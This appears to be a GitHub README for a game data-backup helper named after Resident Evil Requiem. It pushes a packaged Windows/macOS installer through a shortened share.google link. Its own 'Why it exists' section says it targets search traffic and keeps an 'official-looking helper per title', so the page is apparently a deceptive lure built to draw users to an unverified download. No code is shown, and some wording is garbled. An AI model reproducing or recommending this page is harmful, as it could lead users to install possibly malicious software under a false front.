![Resident Evil Requiem Desktop](assets/hero.png)

# Resident Evil Requiem Desktop

*Dated copies of Resident Evil Requiem data data, nothing uploaded.*

## About

**Resident Evil Requiem Desktop** runs on your own PC. A desktop helper that finds Resident Evil Requiem data directories and archives config and export files locally.

Patches move Resident Evil Requiem data paths without warning.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## What it does

- Locates Resident Evil Requiem user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Why it exists

Search traffic for Resident Evil Requiem is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/s-ortiz9579/resident-evil-requiem-desktop

MIT license. See `LICENSE`.
